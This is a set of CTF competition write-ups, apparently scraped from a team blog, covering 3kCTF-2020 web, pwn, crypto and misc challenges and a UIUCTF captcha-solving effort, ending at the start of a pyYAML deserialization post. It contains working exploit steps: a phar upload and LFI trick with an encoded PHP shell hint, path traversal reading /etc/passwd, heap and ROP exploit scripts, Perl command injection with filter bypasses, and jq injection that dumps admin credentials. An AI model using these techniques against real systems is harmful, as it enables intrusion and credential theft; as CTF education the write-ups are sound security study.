$p-\u0026gt;setStub($j.\u0026#34;\u0026lt;?php __HALT_COMPILER(); ? \u0026gt;\u0026#34;); $p-\u0026gt;setMetadata($x); $p-\u0026gt;stopBuffering(); $file = file(\u0026#39;malware.phar\u0026#39;);  之後 upload 個「圖」, 出返個 \u0026quot;filename.jpg\u0026quot;. 之後讀 php://filter/convert.base64-encode/resource=phar:///var/www/html/up/filename.\n Then upload that \u0026quot;image\u0026quot;, will return \u0026quot;filename.jpg\u0026quot;. Then access php://filter/convert.base64-encode/resource=phar:///var/www/html/up/filename.\n 之後點玩自己諗啦. 提示: 估下 PD89YCRfR0VUWzBdYDs= 係咩先.\n The rest is left as an exercise for the readers. (Hint: decode PD89YCRfR0VUWzBdYDs=)\n Remark \n呢題咁易都搞咗我個半鐘真係失敗。\n\nhttps://twitter.com/confus3r/status/1286850105513930752\n慘。早啲起身咪有 First Blood (好似係\ncarthagods (Web; 496 points) Author: rekter0, Dali\n Salute the carthagods!\nHints\n redacted source   Exploit The challenge provided the redacted sourcecode as hints.\n.htaccess\n... RewriteRule ^([a-zA-Z0-9_-]+)$ index.php?*REDACTED*=$1 [QSA] index.php\n... \u0026lt;?php if(@$_GET[*REDACTED*]){ $file=$_GET[*REDACTED*]; $f=file_get_contents(\u0026#39;thecarthagods/\u0026#39;.$file); if (!preg_match(\u0026#34;/\u0026lt;\\?php/i\u0026#34;, $f)){ echo $f; }else{ echo \u0026#39;php content detected\u0026#39;; } } ?\u0026gt;...  The php script accepts user provided $file path without any sanitation, however the GET parameter is redacted.\nThe .htaccess file rewrite the path to index.php with the GET parameter. Lets try the folder thecarthagods as shown in the php file.\ncurl http://carthagods.3k.ctf.to:8039/thecarthagods We got the token\n\u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;301 Moved Permanently\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Moved Permanently\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The document has moved \u0026lt;a href=\u0026#34;http://carthagods.3k.ctf.to:8039/thecarthagods/?eba1b61134bf5818771b8c3203a16dc9=thecarthagods\u0026#34;\u0026gt;here\u0026lt;/a\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.29 (Ubuntu) Server at carthagods.3k.ctf.to Port 8039\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; With the token we can do path traversal\ncurl \u0026#34;http://carthagods.3k.ctf.to:8039/index.php?eba1b61134bf5818771b8c3203a16dc9=../../../../../etc/passwd\u0026#34;root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin ... However we cannot print the content of flag.php directly\ncurl \u0026#34;http://carthagods.3k.ctf.to:8039/index.php?eba1b61134bf5818771b8c3203a16dc9=../flag.php\u0026#34;\u0026lt;textarea class=\u0026#34;label-input100\u0026#34; style=\u0026#34;color:black;width: 100%;height: 300px;\u0026#34;\u0026gt;php content detected \u0026lt;/textarea\u0026gt; From the phpinfo provided we can know opcache is enabled, with opcache.file_cache set to /var/www/cache/. Maybe we can get the compiled version of flag.php and get its content.\nThe opcache will store the cache in the format /var/www/cache/\u0026lt;system_id\u0026gt;/path/to/file.php.bin, with system ID generated from PHP version, Zend version etc. Therefore, I spin up a Ubuntu VM and install the same version of php, enable opcache to get the same system ID.\nThe system ID is: e2c6579e4df1d9e77e36d2f4ff8c92b3\ncurl \u0026#34;http://carthagods.3k.ctf.to:8039/index.php?eba1b61134bf5818771b8c3203a16dc9=../../../../var/www/cache/e2c6579e4df1d9e77e36d2f4ff8c92b3/var/www/html/flag.php.bin\u0026#34; --output -... \u0026lt;textarea class=\u0026#34;label-input100\u0026#34; style=\u0026#34;color:black;width: 100%;height: 300px;\u0026#34;\u0026gt;OPCACHEe2c6579e4df1d9e77e36d2f4ff8c92b3�x��_Jqҍ@������������������������_���Ӛ��_/var/www/html/flag.php������/var/www/html/flag.php1����q��������d!= VPyi0���Y�Į��{�opcache_get_statush���JK��\u0026amp;3k{Hail_the3000_years_7hat_are_b3h1nd}`Lq�(��\u0026lt;iframe width=\u0026#34;560\u0026#34; height=\u0026#34;315\u0026#34; src=\u0026#34;https://www.youtube.com/embed/y8zZXMLBin4\u0026#34; frameborder=\u0026#34;0\u0026#34; allow=\u0026#34;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\u0026#34; allowfullscreen\u0026gt;\u0026lt;/iframe\u0026gt;֖|�flag \u0026lt;/textarea\u0026gt; ... linker (Pwn; 493 points) Solved by cire meat pop.\nProgram root@kali:~/3kctf/linker# ./linker Welcome to your secret journal! Provide name size: 8 Provide a name: abcd Welcome abcd ! What would you like to do? 1- Get new blank page 2- Edit page content 3- Empty a page 4- Relogin 5- Exit \u0026gt;  This seems to be a heap challenge, which allow user to create, edit and free a chunk. Also, it provides a weird function (i.e., relogin) for changing the name which does nothing to the other functions, and usually means it will be used for later exploit.\nVulnerability In 3- Empty a page:\nputs(\u0026#34;Provide page index:\u0026#34;); read(0, \u0026amp;buf, 4uLL); idx = atoi(\u0026amp;buf); if ( idx \u0026lt; 0 || idx \u0026gt; 4 ) { puts(\u0026#34;Wrong index kiddo...\u0026#34;); } else if ( check_pages[idx] ) { free(pages[idx]); check_pages[idx] = 0; // vuln  --number_pages; } After freed a chunk, only the check[idx] is set to 0; and in Edit page content:\nputs(\u0026#34;Provide page index:\u0026#34;); read(0, \u0026amp;buf, 4uLL); idx = atoi(\u0026amp;buf); if ( idx \u0026lt; 0 || idx \u0026gt; 4 ) { puts(\u0026#34;Wrong index kiddo...\u0026#34;); } else if ( pages[idx] ) // not checked { puts(\u0026#34;Provide new page content:\u0026#34;); read(0, pages[idx], (int)page_size[idx]); } Edit function won't check check[idx], which means we can overwrite a free chunk.\nExploit As we can overwrite any data into the free chunk, we can perform some attack to overwrite __malloc_hook or __free_hook with one gadget rce.\nHowever, we had two problems.\n tcache techniques won't work with calloc  Solution: We filled up tcache and perform fastbin attack.  Theres are no show functions to leak libc addresses  Solution: We utilize unsorted bin attack to write unsorted bin address to name, then relogin to print the content of name.   Problem can't access tty; job control turned off\nWill this means we can't open the shell? Whatever, we change the approach from utilizing one gadget RCE to calling the system function. We can overwrite __free_hook with system, then free a chunk with content /bin/cat flag, yielding system(\u0026quot;/bin/cat flag\u0026quot;). However, if we want control __free_hook, we need to try harder. Finally, we perform fastbin attack to control pages and check_pages, edit the pointer of each page to an arbitrary address, and eventually we have arbitrary address write.\n3k{unlink_the_world_and_feel_the_void}\none and a half man (Pwn; 493 points) Solved by cire meat pop.\nProgram ssize_t vuln() { char buf; // [rsp+6h] [rbp-Ah]  return read(0, \u0026amp;buf, 0xAAuLL); } This is a short function that obviously vulnerable to buffer overflow. I have solved similar challenge before, and my approach was to overwrite first 2 byte the read_got to run one gadget RCE. It involves 4 bit randomness to satisfy, hence I have a 1/16 chance to solving it. It works, but can't access tty; job control turned off. Okay, I shouldn't forgot shell interaction is disabled from this server.\nExploit I find a syscall near the one gadget RCE so that we can jump to syscalls. It's time to construct ROP:\nmov eax, 0 ; pop rbp ; ret g1(in binary) mov edx, eax ; mov eax, edx ; ret (in libc) pop rdi; ret (in binary) pop rsi; pop r15; ret (in binary) move eax, 0x3b; syscall (in libc) By this ROP chain we can set edx (the third argument) to 0, control rdi and rsi (the first and the second arguments) and call sys_execve.\nsys_execve(*filename, argv[], envp[]) To cat flag:\nsys_execve(\u0026#39;/bin/cat\u0026#39;, [\u0026#39;/bin/cat\u0026#39;, \u0026#39;flag\u0026#39;], 0) Finally our script:\npayload = \u0026#34;a\u0026#34;*18 + flat(pop_rsi_r15, buf, 0, read_plt, vuln) p.send(payload) sleep(0.5) string = \u0026#34;/bin/cat\u0026#34;.ljust(0x10,\u0026#34;\\x00\u0026#34;)+p64(buf)+p64(buf+0x28) \\ +p64(0)+\u0026#34;flag\u0026#34;+\u0026#34;\\x00\u0026#34;*4 p.send(string) sleep(0.5) payload2 = flat(pop_rsi_r15, setvbuf_got, 0, read_plt, pop_rsi_r15, read_got, \\ 0, read_plt, g1, buf, setvbuf_plt, pop_rdi, buf, pop_rsi_r15, \\ buf+0x10, 0, read_plt) ret p.send(\u0026#34;a\u0026#34;*18 + payload2) sleep(0.5) p.send(\u0026#34;\\x5b\\xd6\u0026#34;) # (in libc) mov edx, eax ; mov eax, edx ; ret sleep(0.5) p.send(\u0026#34;\\x72\\x04\u0026#34;) # (in libc) move eax, 0x3b; syscall sleep(0.5) p.interactive() 3k{one_byte_and_a_half_overwrite_ftw!}\nmicroscopic (Reverse; 488 points) Solved by Mystiz.\nOpen with IDA pro. There is a curious function defined on sub_F7C:\nunsigned __int64 __fastcall sub_F7C(unsigned int a1) { case 3: // ...  // v3 hereby is the length of the length of the target ciphertext  ciphertext[v2] = (v3 ^ input[v12]) + v2; // ...  break; case 4: // ...  v9 = ciphertext[v12] != target_ciphertext[v12]; // ...  break; } Hereby target_ciphertext is is an array of 39 integers, located on 0x202020. We can simply write a Python script that extract target_ciphertext and compute the corresponding input.\nelf = ELF(\u0026#39;challenge/micro\u0026#39;) target = elf.read(0x202020, 39*4) target = [unpack(\u0026#39;I\u0026#39;, target[4*i:4*i+4])[0] for i in range(39)] target = [(c-i)^39 for i, c in enumerate(target)] print(bytes(target)) # 3k{nan0mites_everywhere_everytime_ftw!} game (Reverse/Misc; 486+477 points) Solved by eriri.\ngame 1 find your way to the heart of the maze game 2 the shortest route is often the best You are given an Unity game folder at the beginning. When you start the game, you are in a dark maze. You can walk but not jump nor run. Nothing will be triggered when you walk out of the maze.\nI think there should be multiple ways to solve the challenge. One solution will be physcially break the maze. How to do that? By deleting the walls object in the level.\nWith Unity Assets Bundle Extractor, we are able to delete walls in /CTF_Data/level0 (which is level of the maze). \nAfter deleting some of the wall objects (for me I selected the GameObject Wall with number greater than 100) and returning to the game, you will find a wall that marks the flag for game 2:\n\nThere are some characters missing in the wall because we deleted some of the characters by accident. We did a bit of guess and finally got the flag: 3K-CTF-A-MAZE-ING.\nThere are also some floating walls inside the maze. When you walk through it you will get a word overlayed on the top left corner. \nDecompiling /CTF_Data/Managed/Assembly-CSharp.dll will get you the logic of the game.  If you find and hit the 6 walls with the right order (I guess it should be the shortest path from the starting point to the flag room), the game will output you a flag. If not, an error message will be displayed. \nHere in UABE we found 6 assets with duplicated names. It should correspond to the 6 floating walls in the game. \nAfter some tries (with a bit of luck), we were able to get the flag for game 1. \nFlag: 3K-CTF-GamingIsNotACrime.\nReference: https://github.com/imadr/Unity-game-hacking\npyzzle (Reverse/Misc/Crypto; 459+479 points) Solved by crabmony and Mystiz.\nPart 1 We are given a concrete syntax tree that is from LibCST.\nWe referred to the documentation and traverse the tree manually. Eventually we have manually parsed the tree into a Python script:\nimport binascii plaintext = \u0026#39;REDACTED\u0026#39; def exor(a, b): temp = \u0026#34;\u0026#34; for i in range(n): if a[i] == b[i]: temp = 0 else: temp = 1 return temp def BinaryToDecimal(binary): string = int(binary, 2) return string PT_Ascii = [ord(x) for x in plaintext] PT_Bin = [format(y, \u0026#39;08b\u0026#39;) for y in PT_Ascii] PT_Bin = \u0026#34;\u0026#34;.join(PT_Bin) n = 26936 K1 = \u0026#39;...\u0026#39; # Redacted as this binary string is too long. K2 = \u0026#39;...\u0026#39; # Ditto L1 = PT_Bin[:n] R1 = PT_Bin[n:] f1 = exor(R1,K1) R2 = exor(f1, L1) L2 = R1 f2 = exor(R2, K2) R3 = exor(f2, L2) L3 = R2 R3 = \u0026#39;...\u0026#39; # Ditto L3 = \u0026#39;...\u0026#39; # Ditto cipher = L3 + R3 plaintext = L6 + R6 plaintext = int(plaintext, 2) plaintext = binascii.unhexlify(\u0026#39;%x\u0026#39; % plaintext) print(plaintext) Since we are given everything (except the plaintext), we are able to recover the plaintext by reversing the operations. We ended up with a STP file that contains the flag: 3k{almost_done_shizzle_up_my_nizzle}.\nPart 2 From the STP file, apart from the flag, we have a bunch of nodes and edges. This part we are connecting the dots with Python:\ndef parse_line(line): return list(map(int, line.split(\u0026#39; \u0026#39;)[1:])) def main(): with open(\u0026#39;pyzzle2\u0026#39;) as f: lines = f.read().strip().split(\u0026#39;\\n\u0026#39;) edges = list(map(parse_line, lines[8:124])) points = list(map(parse_line, lines[127:271])) point_map = {} for id, x, y in points: point_map[id] = (x, y) im = Image.new(\u0026#39;1\u0026#39;, (1850, 110), color=1) draw = ImageDraw.Draw(im) for id1, id2, _ in edges: x1, y1 = point_map.get(id1) x2, y2 = point_map.get(id2) draw.line((x1, y1, x2, y2), fill=0) im.save(\u0026#39;flag.png\u0026#39;) main() \nFlag: 3K-PYZZLE_FO_SHIZZLE_MY_NIZZLE.\nA hundred friends (Crypto; 496 points) Solved by Mystiz.\nkey = RSA.generate(1024) pad = random.randint(1, 2**UPPER_BOUND) exp = random.randint(1, 3) c = pow(m**exp + pad, 3, key.n) This is a challenge similar to Multicast in PlaidCTF 2017. Theoretically, we should be able to recover the original message with 3 ciphertexts, assuming that those ciphertexts are encrypted with exp = 1.\nWe have written the core logic to retrieve the message, given some ciphertexts:\ndef attempt(subpairs): n = len(subpairs) # (m + pi)^3 = ci (mod ni) cs = list(map(lambda pair: pair[0], subpairs)) ns = list(map(lambda pair: pair[1], subpairs)) ps = list(map(lambda pair: pair[2], subpairs)) nprod = reduce(mul, ns) gs = [[0 for _ in range(n)] for _ in range(3+1)] for i in range(n): for j in range(3+1): gs[j][i] = binomial(3, j) * pow(ps[i], j, nprod) % ns[i] gs[3][i] = ((gs[3][i] - cs[i]) % ns[i] + ns[i]) % ns[i] gg = [int(crt(gs[i], ns)) for i in range(3+1)] # Defines e, Zn = Zmod(nprod) and the parameters for the # Coppersmith\u0026#39;s attack here. Omitted roots = coppersmith_howgrave_univariate(pol, nprod, beta, mm, tt, XX) if len(roots) \u0026gt; 0: return roots[0] (Some functions are copied from mimoo/RSA-and-LLL-attacks. They are not included here for simplicity)\nHowever, we are unable to recover the message from sampling three ciphertexts in 100 rounds (it should happen in around 27 rounds). The reason is the message isn't small enough for Coppersmith's attack. Hence, we are sampling more ciphertexts (from 3 to 5) and the attack worked:\nn = 5 attempt_count = 0 while True: random.shuffle(pairs) subpairs = pairs[:n] attempt_count += 1 if attempt_count % 100 == 0: print(f\u0026#39;Attempt {attempt_count}\u0026#39;) m = attempt(subpairs) if m is None: continue m = int(m) flag = m.to_bytes(length=(m.bit_length() + 7)//8, byteorder=\u0026#39;big\u0026#39;) print(subpairs) print(flag) break # b\u0026#39;3k{H4st4d_St1ll_Rul3S}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39; Note that there is a chance to return m^2 or m^3. As I am lazy, I just run the script again until it returns m.\nRSA textbook (Crypto; 496 points) Solved by Mystiz.\nThis challenge is similar to De1CTF's easyRSA. By reading the same reference paper [Howgrave-Graham 1999], we have the matrix in session 3.3. By using the matrix directly and perform LLL, we can recover d1 (the private key that corresponds to e1). We can then recover phi(n) and thus compute d (that corresponds to e), hence decrypting the ciphertext: 3k{hOwGr4v3_gr4h4m_and_s31F3rt_4re_C00l}AAAAAAAAAAAAAAAAAAAA.\nYou shall not get my cookies (Crypto; 495 points) Solved by Mystiz.\nThis is a standard padding oracle attack.\ndef connect(): HOST = \u0026#39;youshallnotgetmycookies.3k.ctf.to\u0026#39; PORT = 13337 global debug if debug: context.log_level = \u0026#39;debug\u0026#39; else: context.log_level = \u0026#39;error\u0026#39; r = remote(HOST, PORT) return r def oracle(ciphertext): r = connect() payload = binascii.hexlify(ciphertext) r.sendlineafter(b\u0026#39;~ So... whats your cookie:\u0026#39;, payload) r.recvuntil(b\u0026#39;~ \u0026#39;) res = r.recvline().strip() r.close() return res != b\u0026#39;That cookie looks burned!\u0026#39; def main(): ciphertext = binascii.unhexlify(\u0026#39;90C560B2A01529EF986E54B016E1FEAAD79A54BE52B373311E3B4F8251BE269EC199AE6B370BFCE50A54EEC25ABB0F22\u0026#39;) po = PaddingOracle(oracle, threads=16) plaintext = po.recover(ciphertext) print(plaintext) # b\u0026#39; chocolate chip cookie\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\u0026#39; ciphertext = po.forge(b\u0026#39;Maple Oatmeal Biscuits\u0026#39; + b\u0026#39;\\x0a\u0026#39; * 10) r = connect() r.sendlineafter(b\u0026#39;~ So... whats your cookie:\u0026#39;, binascii.hexlify(ciphertext)) r.interactive() # ~ YES, that is exactly what i wanted! # ~ Take it! 3k{Y3t_An0th3r_Padd1ng_Oracle} main() once upon a time (Crypto; 492 points) Solved by Mystiz.\nWith a bit of code review, it is running a block cipher with block size = 1 (Source: the encrypt_file method in /src/cipher.c). The key is also redacted from the source (Source: /src/main.c). Moreover, surprisingly, the key is not redacted from the binary.\n*(_QWORD *)v45 = \u0026#39;\\x01\\0\\0\\0\\x01\\x01\\x01\\0\u0026#39;; *(_QWORD *)\u0026amp;v45[8] = \u0026#39;\\x01\\0\\x01\\0\\0\\x01\\x01\\0\u0026#39;; *(_QWORD *)\u0026amp;v45[16] = \u0026#39;\\x01\\0\\x01\\0\\x01\\0\\0\u0026#39;; *(_QWORD *)\u0026amp;v45[24] = \u0026#39;\\x01\\x01\\x01\\x01\\x01\\0\\0\\x01\u0026#39;; *(_QWORD *)\u0026amp;v45[32] = \u0026#39;\\x01\\0\\0\\0\\0\\0\\x01\\x01\u0026#39;; But if you think I am going to reverse the algorithm, you are wrong. I'm just using the binary as an encryption oracle.\ndef encrypt(plaintext, mode): context.log_level = \u0026#39;error\u0026#39; with open(\u0026#39;plaintext\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(plaintext) r = process([\u0026#39;challenge/scss\u0026#39;, \u0026#39;plaintext\u0026#39;, \u0026#39;ciphertext\u0026#39;, \u0026#39;encrypt\u0026#39;, mode]) r.wait_for_close() r.close() with open(\u0026#39;ciphertext\u0026#39;, \u0026#39;rb\u0026#39;) as f: ciphertext = f.read() return ciphertext def recover(target_ciphertext, mode): message = b\u0026#39;\u0026#39; for i in range(len(target_ciphertext)): for j in range(256): plaintext = message + bytes([j]) ciphertext = encrypt(plaintext, mode) if target_ciphertext.startswith(ciphertext): message = plaintext print(i, message) break return message def main(): with open(\u0026#39;challenge/flag_encrypted\u0026#39;, \u0026#39;rb\u0026#39;) as f: target_ciphertext = f.read() # print(recover(target_ciphertext, \u0026#39;ecb\u0026#39;)) # print(recover(target_ciphertext, \u0026#39;cbc\u0026#39;)) # print(recover(target_ciphertext, \u0026#39;cfb\u0026#39;)) print(recover(target_ciphertext, \u0026#39;ofb\u0026#39;)) # b\u0026#39;3k{my_hands_are_registered_as_lethal_weapons_that_means_we_get_into_a_fight_i_accidentally_kill_you_i_go_to_jail}\u0026#39; flood (Misc; 495 points) Solved by Mystiz.\nWe have a service running remotely. The source code, service.pl, is given to us. Perl sadness2 strikes back...\nObviously, we can actually earn more gold by selling gold. From the source code:\nprint \u0026#34;? how much gold u wanna spend\\n\u0026#34;; print \u0026#34;! 1 GOLD = 1000 POINTS\\n\u0026gt; \u0026#34;; my $subm = \u0026lt;STDIN\u0026gt;; chomp $subm; if( ($subm) \u0026lt;= $gold and int($subm)\u0026gt;=0){ $gold -= ($subm); $points += ($subm)*1000; } Why? We can set $subm = -0.9999... In this case we can generate as much gold as we want.\nAnother vulnerability comes from theh following line that runs during load game. This API opens if you are rich enough -- well, we are.\n# $name is what we can control. However, `.`, `/` and ` ` are forbidden. open (SAVEGAME, \u0026#34;/app/files/\u0026#34;.$name) or break; How? For example, if $name = \u0026quot;||ls|\u0026quot;; it executes ls from shell. But what if we want to execute ls / given that and / are forbidden? In short, we can use \\t (\u0026lt;TAB\u0026gt;) in place of the (\u0026lt;SPACE\u0026gt;), and $(expr\\tsubstr\\t$PWD\\t1\\t1) in place of /.\nHence, we can send use ||ls\\t\u0026quot;$(expr\\tsubstr\\t$PWD\\t1\\t1)\u0026quot;\\t-al| as our name and the directory can be listed. The following line is curious...\n-rw-r--r-- 1 root root 30 Jul 23 14:26 fcad0373020fa6ede979389f558b396f4cd38ec1_README\u0026#39; We can use cat /fcad0373020fa6ede979389f558b396f4cd38ec1_README (with the above substitution) as our name. Finally the flag is there: 3k{p333rl_aInt_7hat_deAd_Y3t}.\nlibcDB (Misc; 494 points) We are given a libc database search (which looks useful and we should definitely have one ourselves!). Playing with the API we have met the following error:\n\u0026gt; .search fprintf 0x4b970 .. jq: error: Invalid numeric literal at EOF at line 1, column 3 (while parsing \u0026#39;...\u0026#39;) at \u0026lt;top-level\u0026gt;, line 1: . as $maindb | .libcDB[] | select(.symbol==\u0026#34;fprintf\u0026#34;) | select(.address|contains(\u0026#34;309616\u0026#34;)) | ... jq: 1 compile error If we have to make an educated guess on the actual query, it would be:\njq \u0026#39;. as $maindb | .libcDB[] | select(.symbol==\u0026#34;[SYMBOL]\u0026#34;) \\ | select(.address|contains(\u0026#34;[ADDR]\u0026#34;)) | .[FILTER]\u0026#39; test.json Read along the documentation of jq, we have experimented around:\n\u0026gt; .search fprintf 0 |$maindb|keys|{id:.[]} Found: id\tlibcDB Found: id\tusers\u0026gt; .search fprintf 0 |$maindb.users[]|keys|{id:.[]} Found: id\tpassword Found: id\tusername\u0026gt; .search fprintf 0 |$maindb.users[]|{id:.username,symbol:.password} Found: id\t3k symbol\tnotaflag Found: id\tJames symbol\tHetfield Found: id\tLars symbol\tUlrich Found: id\tDead symbol\tpool Found: id\tadmin symbol\tv3ryL0ngPwC4nTgu3SS0xfff Found: id\tjim symbol\tcarrey Okay. Great, we have the credentials of the admin. Connecting to the service again, and this time we are signing in with it.\n$ nc libcdb.3k.ctf.to 7777 Login \u0026gt; admin Password \u0026gt; v3ryL0ngPwC4nTgu3SS0xfff Authenticated {\u0026#34;users\u0026#34;:{\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;v3ryL0ngPwC4nTgu3SS0xfff\u0026#34;}} __ _ _ ____ _____ | | |_| |_ ___| \\| __ | | |__| | . | _| | | __ -| |_____|_|___|___|____/|_____| as a service Type .help for help \u0026gt; .secret 3k{jq_is_r3ally_HelpFULL_3af4bcd97f5}  DNS rebinding from Wikipedia [return] The Perm Jam 2: The Camel Strikes Back - @na7irub [return]   ","permalink":"https://b6a.black/posts/2020-07-28-3kctf/","summary":"reporter (Web; 498 points) Solved by apple.\nAuthor: rekter0\n Reporter is an online markdown reporting tool. it's free to use for everyone. there's a secret report we need located here\nsource\n Walkthrough The application provide markdown hosting service and it will automatically download and embed external images (or any files) to the 'report'.\nThere are 4 buttons on the interface: Edit, Preview, Save, and Deliver.\nThe first target of the challenge is to access the secret_report.","title":"3kCTF-2020 Writeup"},{"content":" @font-face { font-family: 'minecraft-enchantment'; src: url('/images/2020-07-22-uiuctf-bot-protection-iv/minecraft-enchantment.ttf'); }   In this challenge, we have a website with captcha. Base on the question, we need to solve 500 captcha within 10 minutes. Very easy right?\n However, the language of this captcha is the Standard Galactic Alphabet (Minecraft enchantment glyphs).\nThe character mapping:\n From the source code, there is a curious comment:\n\u0026lt;!--TODO: we don\u0026#39;t need /captchas.zip anymore now that we dynamically create captchas. We should delete this file.--\u0026gt; We are able to obtain ~70k samples here provided by the challenge author.\n This is one of the sample captchas:\n With this dataset, I think everyone can think of using neural network to solve this challenge (I guess MNIST or captcha solving should be the first example you run in deep learning course, right?)\nFrom my experience, I know that it may not a good idea for me to debug/tune a neural network for doing computer vision work during a CTF. After some trial and error, I come across with this excellent github repo cnn_captcha. I also received a interactive script from my god like teammate @mystiz613.\nIn order to use this code, you need to setup the config file (conf/sample_config.json) properly. This is my configuration:\n{ \u0026#34;origin_image_dir\u0026#34;: \u0026#34;/home/xxx/solve/captchas/\u0026#34;, \u0026#34;new_image_dir\u0026#34;: \u0026#34;/home/xxx/solve/new_train/\u0026#34;, \u0026#34;train_image_dir\u0026#34;: \u0026#34;/home/xxx/solve/train/\u0026#34;, \u0026#34;test_image_dir\u0026#34;: \u0026#34;/home/xxx/solve/test/\u0026#34;, \u0026#34;api_image_dir\u0026#34;: \u0026#34;sample/api/\u0026#34;, \u0026#34;online_image_dir\u0026#34;: \u0026#34;sample/online/\u0026#34;, \u0026#34;local_image_dir\u0026#34;: \u0026#34;sample/local/\u0026#34;, \u0026#34;model_save_dir\u0026#34;: \u0026#34;model_v8/\u0026#34;, \u0026#34;image_width\u0026#34;: 250, \u0026#34;image_height\u0026#34;: 75, \u0026#34;max_captcha\u0026#34;: 5, \u0026#34;image_suffix\u0026#34;: \u0026#34;png\u0026#34;, \u0026#34;char_set\u0026#34;: \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;, \u0026#34;use_labels_json_file\u0026#34;: false, \u0026#34;remote_url\u0026#34;: \u0026#34;http://127.0.0.1:6100/captcha/\u0026#34;, \u0026#34;cycle_stop\u0026#34;: 20000, \u0026#34;acc_stop\u0026#34;: 0.99, \u0026#34;cycle_save\u0026#34;: 500, \u0026#34;enable_gpu\u0026#34;: 1, \u0026#34;train_batch_size\u0026#34;: 32, \u0026#34;test_batch_size\u0026#34;: 32 } First attempt With one GeForce RTX 2080, I can train up a model with 99% accuracy within 1.5 hours. Here I didn't do a proper separate of train and test sets, but turns out this model saved me a lot later...\nThis model mostly end up in level 30 to 40 and start to fail. Anyway, it is normal. With a 99% accuracy, we only have 0.6570% to survive up to lv 500 🙁\n Second attempt Here, I think of Ensemble Learning.\n The idea of ensemble learning is very simple. Assume we trained multiple classifer for the same classification problem, we create a classification base on multiple classifier to our input. We apply a similar concept here, but we hope any one of them could solve the captcha even the previous model fails to do. Originally, we think of bruteforce the top 2 decision of each character, but turns out it requires 32 query, which we may run out of time...\nTo train up different models, I tried to play with the different parameters like batch size, size of evaluation set and different training set, etc.\nI also collected extra dataset by save those captcha we solved with only 1 model and denote as good set, those with more than 2 models as benign set. We feed these data to our training script to train new model and deploy it to collect more new samples. In total, we collected 120k samples and trained 8 models through this iterating process.\nThe strategy for adding new samples to the dataset as follows, we tried to extend our dataset upto about 90k with both good set and benign set. And the last 20k is from the benign set. We also trained several models with different numbers of data samples during our data collection procedures.\nThe best result with five models is 169 levels, while I can attain reach level 225 with eight models. For 5 models to 8 models ensemble, we improve from solving 40 level before fail to average solving 60 level. However, it still very far away from solving 500 within 10 minutes.\nAt the end, my god like teammate @mystiz613 come up with an idea to solve as a hybird approach (DL model + human)... That is, if a captcha can't be solve with 8 of my models, I will do it myself...\nAfter 3 trials (once timeout at 495 lv, once at 365 lv), we succesfully capture the flag with ~90 second left by luck (manually solved ~10 times in total)...\n Level 497 is not high enough Invalid captcha Invalid captcha Invalid captcha Invalid captcha Invalid captcha Level 498 is not high enough Level 499 is not high enough uiuctf{i_knew_a_guy_in_highschool_that_could_read_this} Credits 90% of work from @mystiz613, 10% from me.\nReflection I guess there are better way to solve it with full automation right? After submitted the flag, I tried to do cause analysis why is such hard to solve with full automation (I know that I am too weak, please don't laugh at me 😭). These are my observations:\nDuplicate characters Continuous duplicate character is hard to solve with my model.\nJGGSS:\n YJKYY:\n J, R, P and Y Due to similar shape to other characters or is formed by more than 2 components...\nYJKYY:\n JPSCB:\n FDSEJ:\n VJGJJ:\n Similar glyphs In fact, most of cases I solve manually the edit distance is between 1-2 characters and the problematic region are share by different models...\nFor example PTJYZ:\n Option available:\n  That is it! Thanks for reading! :)\n\n","permalink":"https://b6a.black/posts/2020-07-22-uiuctf-bot-protection-iv/","summary":"In this challenge, we have a website with captcha. Base on the question, we need to solve 500 captcha within 10 minutes. Very easy right?","title":"UIUCTF 2020: Bot Protection IV"},{"content":" Update: It was assigned as CVE-2020-14343 after the contest.\n This was a fun challenge exploiting a deserialize service in Python.\nThe server is using pyYAML and Flask, with the source code below:\nfrom flask import Flask, session, request, make_response import yaml import re import os app = Flask(__name__) app.secret_key = os.urandom(16) @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#34;POST\u0026#34;]) def pwnme(): if not re.fullmatch(b\u0026#34;^[\\n --/-\\]a-}]*$\u0026#34;, request.data, flags=re.MULTILINE): return \u0026#34;Nice try!\u0026#34;, 400 return yaml.load(request.data) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8080) Bascially it is a service to do yaml.load() to your input and print it (return) with limitation to block some special character (especially . and _)\nThe version of pyYAML and flask is both at latest release, so its not with an challenge with an existing CVE.\nWe noticed that yaml.load is \u0026quot;unsafe\u0026quot; by the README:\nWhen LibYAML bindings are installed, you may use fast LibYAML-based parser and emitter as follows: \u0026gt;\u0026gt;\u0026gt; yaml.load(stream, Loader=yaml.CLoader) \u0026gt;\u0026gt;\u0026gt; yaml.dump(data, Dumper=yaml.CDumper) If you don\u0026#39;t trust the input stream, you should use: \u0026gt;\u0026gt;\u0026gt; yaml.safe_load(stream) So we dig into the internals of yaml loader.\nFrom the source code, when loader is not provided, it uses FullLoader\ndef load(stream, Loader=None): \u0026#34;\u0026#34;\u0026#34; Parse the first YAML document in a stream and produce the corresponding Python object. \u0026#34;\u0026#34;\u0026#34; if Loader is None: load_warning(\u0026#39;load\u0026#39;) Loader = FullLoader loader = Loader(stream) try: return loader.get_single_data() finally: loader.dispose() And FullLoader uses FullConstructor to construct the python objects in: 